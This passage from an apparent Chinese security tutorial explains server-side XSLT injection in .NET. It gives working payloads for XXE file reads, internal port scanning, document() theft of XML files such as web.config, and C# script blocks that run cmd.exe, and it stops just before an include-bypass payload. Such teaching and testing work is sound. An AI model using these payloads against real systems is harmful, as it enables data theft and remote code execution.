<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" ?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">fruits</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">fruit</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Lemon<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Yellow and sour<span class="tag">&lt;/<span class="name">description</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">fruit</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">fruit</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Watermelon<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Round, green outside, red inside<span class="tag">&lt;/<span class="name">description</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">fruit</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">fruits</span>&gt;</span></div></pre></td></tr></table></figure>
<p>为了将XML文档转为纯文本，使用如下XSL转换：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/fruits"</span>&gt;</span></div><div class="line">    Fruits:</div><div class="line">    <span class="comment">&lt;!-- Loop for each fruit --&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">xsl:for-each</span> <span class="attr">select</span>=<span class="string">"fruit"</span>&gt;</span></div><div class="line">      <span class="comment">&lt;!-- Print name: description --&gt;</span></div><div class="line">      - <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"name"</span>/&gt;</span>: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"description"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">xsl:for-each</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></div></pre></td></tr></table></figure>
<p>使用上述转换规则对数据进行转换的结果是下面的纯文本文件：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Fruits:</div><div class="line"></div><div class="line">      - Lemon: Yellow and sour</div><div class="line">      - Watermelon: Round, green outside, red inside</div></pre></td></tr></table></figure>
<h2 id="利用XSLT服务端注入"><a href="#利用XSLT服务端注入" class="headerlink" title="利用XSLT服务端注入"></a>利用XSLT服务端注入</h2><p>在本节中，我们提供一种方法来测试应用程序的XSLT漏洞，并讲述漏洞的发现到利用。在这些示例中，我们专注于使用Microsoft System.Xml XSLT实现的易受攻击的应用程序。然而类似的技术也适用于其他常见的库，如Libxslt，Saxon和Xalan。</p>
<h4 id="发现存在漏洞的切入点"><a href="#发现存在漏洞的切入点" class="headerlink" title="发现存在漏洞的切入点"></a>发现存在漏洞的切入点</h4><p>第一步是识别应用存在漏洞的部分。</p>
<p>最简单的情况是应用允许上传任意的XSLT文件。</p>
<p>如果不是那种情况，易受攻击的应用也可能因为使用了不受信任的用户输入去动态生成XSL转换的XMl文档。</p>
<p>比如应用可能生成下面的XSLT文档，字符串“Your Company Name Here”源于不受信任的用户输入。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=”1.0” encoding=”utf-8”?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/fruits"</span>&gt;</span></div><div class="line">    Your Company Name Here</div><div class="line">    Fruits:</div><div class="line">    <span class="comment">&lt;!-- Loop for each fruit --&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">xsl:for-each</span> <span class="attr">select</span>=<span class="string">"fruit"</span>&gt;</span></div><div class="line">      <span class="comment">&lt;!-- Print name: description --&gt;</span></div><div class="line">      - <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"name"</span>/&gt;</span>: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"description"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">xsl:for-each</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">xsl:include</span> <span class="attr">href</span>=<span class="string">"external_transform.xslt"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></div></pre></td></tr></table></figure>
<p>为了判断应用是否易受攻击，通过注入导致错误XML语法的字符（比如双引号、单引号、尖括号）是有效的方法。如果服务器返回了错误，那么应用则可能易受攻击。总的来说，这种识别技术和XML注入漏洞识别技术是相同的。</p>
<p>后面要描述的攻击中存在一部分只适用注入点位于文档的特定位置。但不要担心，我们会演示一种通过import和include函数来绕过这种限制。</p>
<p>为了尽可能简单化，接下来的例子中都是假定我们能够向应用提交任意的XSLT文档。如有特殊情况会另有说明。</p>
<h4 id="system-property-函数和指纹"><a href="#system-property-函数和指纹" class="headerlink" title="system-property()函数和指纹"></a>system-property()函数和指纹</h4><p>攻击者一旦确认了易受攻击点，那么对他来说识别操作系统指纹和确定正在使用的XSLT实现是很有用的。除此之外，对于攻击者来说了解应用程序使用的XSLT库对于尝试构造攻击载荷是非常有帮助的。</p>
<p>由于不同的库实现了不同的XSLT特性，一个库中可用的特性在其他库中不一定能用，而且大多时候被实现的专用扩展在不同的库中是不兼容的。</p>
<p>除了刚才所提到的，库的默认设置会因实现变化而广泛的变化。通常是老版本库默认启用了危险的特性，而新库要求开发人员在需要时明确启用它们。</p>
<p>我们可以通过system-property()函数来获取库发布者的名字，该函数是XSLT v1.0d的标准，所以所有的库都实现了这一点。</p>
<p>正确有效的参数是：</p>
<ul>
<li>xsl: vendor</li>
<li>xsl: vendor-url</li>
<li>xsl: version</li>
</ul>
<p>下列转换可以用来判断库的发布者：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/fruits"</span>&gt;</span></div><div class="line">	<span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"system-property('xsl:vendor')"</span>/&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></div></pre></td></tr></table></figure>
<p>在本例中，我们测试的是Microsoft .Net System.xml实现的应用，所以system-property()函数返回值是”Microsoft”:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Microsoft</div></pre></td></tr></table></figure>
<h4 id="数据窃取和使用XXE进行端口扫描"><a href="#数据窃取和使用XXE进行端口扫描" class="headerlink" title="数据窃取和使用XXE进行端口扫描"></a>数据窃取和使用XXE进行端口扫描</h4><p>考虑到XSLT的文档格式是XML，那么常见的XML攻击（比如<a href="https://en.wikipedia.org/wiki/Billion_laughs_attack" target="_blank" rel="external"><em>Billion laughs</em> attack</a>、XML外部实体攻击）也能正常作用于XSLT，这就是很正常的一件事了。<em>billion loughs</em> attack是一种拒绝服务攻击，以耗尽服务器内存资源为目的。就本篇文章目的考虑，我们更倾向于XML外部实体攻击。</p>
<p>接下来的例子中，我们使用外部实体去获取“C:\secretfruit.txt”的内容。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"><span class="meta">&lt;!DOCTYPE dtd_sample[&lt;!ENTITY ext_file SYSTEM "C:\secretfruit.txt"&gt;]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/fruits"</span>&gt;</span></div><div class="line">    Fruits &amp;ext_file;:</div><div class="line">    <span class="comment">&lt;!-- Loop for each fruit --&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">xsl:for-each</span> <span class="attr">select</span>=<span class="string">"fruit"</span>&gt;</span></div><div class="line">      <span class="comment">&lt;!-- Print name: description --&gt;</span></div><div class="line">      - <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"name"</span>/&gt;</span>: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"description"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">xsl:for-each</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></div></pre></td></tr></table></figure>
<p>实体元素将文件内容放在了”ext_file”的引用中，然后通过”&amp;ext_file”在主文档中打印显示出来。输出的结果揭示了文件的内容是”Golden Apple”。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Fruits Golden Apple:</div><div class="line"></div><div class="line">      - Lemon: Yellow and sour</div><div class="line">      - Watermelon: Round, green outside, red inside</div></pre></td></tr></table></figure>
<p>通过该技术可以获取存储在web服务器上的文件和内部系统上的web页面（攻击者无法直接访问），也可能是包含身份认证的配置文件或者包含其他敏感信息的文件。</p>
<p>除此之外，攻击者亦可通过UNC路径（\\servername\share\file）和URLs（<a href="http://servername/file）而不是文件路径来获取文件，甚至可以通过该技术获取到受害者网络其他系统上的文件。" target="_blank" rel="external">http://servername/file）而不是文件路径来获取文件，甚至可以通过该技术获取到受害者网络其他系统上的文件。</a></p>
<p>通过事先准备的清单上的IP地址和端口，可以根据应用程序响应来确定远程端口是打开还是关闭。比如，应用程序可能会显示不同的错误消息或在响应中引入时间延迟。</p>
<p>接下来的XSLT转换使用了URL：<a href="http://172.16.132.1:25" target="_blank" rel="external">http://172.16.132.1:25</a> 而不是上个例子中的本地文件格式。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"><span class="meta">&lt;!DOCTYPE dtd_sample[&lt;!ENTITY ext_file SYSTEM "http://172.16.132.1:25"&gt;]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/fruits"</span>&gt;</span></div><div class="line">    Fruits &amp;ext_file;:</div><div class="line">    <span class="comment">&lt;!-- Loop for each fruit --&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">xsl:for-each</span> <span class="attr">select</span>=<span class="string">"fruit"</span>&gt;</span></div><div class="line">      <span class="comment">&lt;!-- Print name: description --&gt;</span></div><div class="line">      - <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"name"</span>/&gt;</span>: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"description"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">xsl:for-each</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></div></pre></td></tr></table></figure>
<p>下方的截图显示了应用程序尝试链接刚才的URL引起的错误返回，这表明了25号端口是关闭的。</p>
<p><img src="/2017-10-09-XSLT-attack/XSLT attack/XSLT_1.png" alt=""></p>
<p>接着将URL替换为<a href="http://172.16.132.1:1234" target="_blank" rel="external">http://172.16.132.1:1234</a> ，此时的错误信息截然不同，这暗示着1234端口是开放的。</p>
<p><img src="/2017-10-09-XSLT-attack/XSLT attack/XSLT_2.png" alt=""></p>
<p>攻击者可以使用这种技术对受害者的内部网络进行侦察扫描。</p>
<p>####数据窃取和使用document()进行端口扫描</p>
<p>document函数允许XSLT转换获取存储在除了主数据源以外的外部XML文档中的数据。</p>
<p>攻击者可以滥用document函数来读取远程系统的文件，通常是以转换结果的整个内容进行拷贝为手段。但这种攻击要求文件是格式工整的XML文档，但这并不总是个问题，因为大多数时候敏感信息总是存储在XML文件中。比如在一个asp.net web应用中，web.config文件就是个很好的例子因为它包含了数据库认证信息。</p>
<p>让我们看下这种用法的例子。下面的转换可以用于窃取“C:\secrectfruit.xml”的内容：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/fruits"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">xsl:copy-of</span> <span class="attr">select</span>=<span class="string">"document('C:\secretfruit.xml')"</span>/&gt;</span></div><div class="line">    Fruits:</div><div class="line">	    <span class="comment">&lt;!-- Loop for each fruit --&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">xsl:for-each</span> <span class="attr">select</span>=<span class="string">"fruit"</span>&gt;</span></div><div class="line">      <span class="comment">&lt;!-- Print name: description --&gt;</span></div><div class="line">      - <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"name"</span>/&gt;</span>: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"description"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">xsl:for-each</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></div></pre></td></tr></table></figure>
<p>转换的结果显示了上文提到的文件的内容:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">fruits</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">fruit</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Golden Apple<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Round, made of Gold<span class="tag">&lt;/<span class="name">description</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">fruit</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">fruits</span>&gt;</span></div><div class="line">    Fruits:</div><div class="line"></div><div class="line">      - Lemon: Yellow and sour</div><div class="line">      - Watermelon: Round, green outside, red inside</div></pre></td></tr></table></figure>
<p>与XXE攻击相似，document()函数可以用于获取远程系统的文档并且能通过UNC路径或如下所示URL来进行基本的网络扫描：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/fruits"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">xsl:copy-of</span> <span class="attr">select</span>=<span class="string">"document('http://172.16.132.1:25')"</span>/&gt;</span></div><div class="line">    Fruits:</div><div class="line">	    <span class="comment">&lt;!-- Loop for each fruit --&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">xsl:for-each</span> <span class="attr">select</span>=<span class="string">"fruit"</span>&gt;</span></div><div class="line">      <span class="comment">&lt;!-- Print name: description --&gt;</span></div><div class="line">      - <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"name"</span>/&gt;</span>: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"description"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">xsl:for-each</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></div></pre></td></tr></table></figure>
<h4 id="嵌入脚本区块执行远程代码"><a href="#嵌入脚本区块执行远程代码" class="headerlink" title="嵌入脚本区块执行远程代码"></a>嵌入脚本区块执行远程代码</h4><p>嵌入的脚本区块是专有的XSLT扩展，可以直接在XSLT文档中包含代码。在微软的实现中，可以包含C#代码。当文档被解析，远程服务器会编译然后执行代码。</p>
<p>下面的XSLT文档是一个POC，作用是列出当前目录下的所有文件。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span></span></div><div class="line"><span class="attr">xmlns:msxsl</span>=<span class="string">"urn:schemas-microsoft-com:xslt"</span></div><div class="line"><span class="attr">xmlns:user</span>=<span class="string">"urn:my-scripts"</span>&gt;</div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">msxsl:script</span> <span class="attr">language</span> = <span class="string">"C#"</span> <span class="attr">implements-prefix</span> = <span class="string">"user"</span>&gt;</span></div><div class="line">&lt;![CDATA[</div><div class="line">public string execute()&#123;</div><div class="line">System.Diagnostics.Process proc = new System.Diagnostics.Process();</div><div class="line">proc.StartInfo.FileName= "C:\\windows\\system32\\cmd.exe";</div><div class="line">proc.StartInfo.RedirectStandardOutput = true;</div><div class="line">proc.StartInfo.UseShellExecute = false;</div><div class="line">proc.StartInfo.Arguments = "/c dir";</div><div class="line">proc.Start();</div><div class="line">proc.WaitForExit();</div><div class="line">return proc.StandardOutput.ReadToEnd();</div><div class="line">&#125;</div><div class="line">]]&gt;</div><div class="line"><span class="tag">&lt;/<span class="name">msxsl:script</span>&gt;</span></div><div class="line"></div><div class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/fruits"</span>&gt;</span></div><div class="line">  --- BEGIN COMMAND OUTPUT ---</div><div class="line">	<span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"user:execute()"</span>/&gt;</span></div><div class="line">  --- END COMMAND OUTPUT ---	</div><div class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></div></pre></td></tr></table></figure>
<p>首先我们在“xsl：stylesheet”标签中定义了两个新的XML前缀。第一个“xmlns：msxsl”用来启用Microsoft的专有扩展格式，第二个“xmlns：user”声明了“msxsl：script”脚本块实现的自定义用户扩展接口。</p>
<p>C#代码实现了execute()函数，用于执行”cmd.exe /c dir”命令并将结果以字符串形式返回。最后函数是在“xsl:value-of”标签中调用。</p>
<p>该转换的结果等同于命令”dir”执行的输出：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">--- BEGIN COMMAND OUTPUT ---</div><div class="line">         Volume in drive C has no label.</div><div class="line"> Volume Serial Number is EC7C-74AD</div><div class="line"></div><div class="line"> Directory of C:\Users\context\Documents\Visual Studio 2015\Projects\XsltConsole</div><div class="line">Application\XsltConsoleApplication\bin\Debug</div><div class="line"></div><div class="line">22/02/2017  15:19    <span class="tag">&lt;<span class="name">DIR</span>&gt;</span>          .</div><div class="line">22/02/2017  15:19    <span class="tag">&lt;<span class="name">DIR</span>&gt;</span>          ..</div><div class="line">22/02/2017  13:30               258 data.xml</div><div class="line">22/02/2017  14:48               233 external_transform.xslt</div><div class="line">22/02/2017  15:15                12 secretfruit.txt</div><div class="line">31/01/2017  13:45               154 secretfruit.xml</div><div class="line">22/02/2017  15:29               831 transform.xslt</div><div class="line">22/02/2017  13:49             7,168 XsltConsoleApplication.exe</div><div class="line">26/01/2017  15:42               189 XsltConsoleApplication.exe.config</div><div class="line">22/02/2017  13:49            11,776 XsltConsoleApplication.pdb</div><div class="line">               8 File(s)         20,621 bytes</div><div class="line">               2 Dir(s)   9,983,107,072 bytes free</div><div class="line"></div><div class="line">  --- END COMMAND OUTPUT ---</div></pre></td></tr></table></figure>
<h4 id="import和incldue曲线救国"><a href="#import和incldue曲线救国" class="headerlink" title="import和incldue曲线救国"></a>import和incldue曲线救国</h4><p>import和include标签可用于组合多个XSLT文档。如果我们碰到了这么一种情况（只能在XSLT文档的中间部分注入字符），那么直接使用XXE攻击或者include脚本都是不可能的，因为这两种手法都要求注入点在文档的顶部。</p>
<p>攻击者通过将XSLT文档和外部文档组合来打破这种限制，import和incldue函数可以达到这样的效果。在加载外部文件时，整个文档将被解析。如果攻击者可以控制这个过程，那么他们可以使用XXE和在外部文件中使用内嵌脚本这两种攻击方式。</p>
<p>外部文件可能是之前上传到服务器上的文件，只要文件内容是XML格式那扩展名是什么就没关系了。当然外部文件也可能是攻击者服务器上的一个文件，通过URL来引用。</p>
<p>当“xsl:include”在其他地方使用时，“xsl:import”标签只能作为“xsl:stylesheet”标签的第一个子标签。</p>
<p>接着让我们使用之前的XSLT文档吧，假设我们只能在字符串“Your Company Name Here” 中进行注入：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=”1.0” encoding=”utf-8"?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/fruits"</span>&gt;</span></div><div class="line">    Your Company Name Here</div><div class="line">    Fruits:</div><div class="line">	    <span class="comment">&lt;!-- Loop for each fruit --&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">xsl:for-each</span> <span class="attr">select</span>=<span class="string">"fruit"</span>&gt;</span></div><div class="line">      <span class="comment">&lt;!-- Print name: description --&gt;</span></div><div class="line">      - <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"name"</span>/&gt;</span>: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"description"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">xsl:for-each</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">xsl:include</span> <span class="attr">href</span>=<span class="string">"external_transform.xslt"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></div></pre></td></tr></table></figure>
<p>在上面的转换中，我们想包含下面名为external_transform.xslt的外部文件。为了使事情简单化，外部转换只打印简要的信息；然而外部转换可以用之前提到过的任何攻击所代替（包括那些需要在文档顶部进行声明的攻击手法），比如内嵌的脚本区块在上述转换中不能直接注入。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=”1.0” encoding=”utf-8”?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/"</span>&gt;</span></div><div class="line">	 Hello from the external transformation</div><div class="line">    <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></div></pre></td></tr></table></figure>
<p>为了包含外部文档，我们需要注入如下标签：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">xsl:include</span> <span class="attr">href</span>=<span class="string">"external_transform.xslt"</span>/&gt;</span></div></pre></td></tr></table></figure>
<p>然而，这存在一个问题：“xsl:include” 不能被“xsl:template”包含并且转换后的文件必须是格式良好的XML文档。所以我们的第一步是要闭合该标签“xsl:template”，接着添加“xsl:incldue”标签，这就能满足第一个要求了。为了获取到格式良好的XML文档，在“xsl:incldue”标签后我们需要再次打开“xsl:template”标签。</p>
<p>生成的攻击载荷如下：</p>
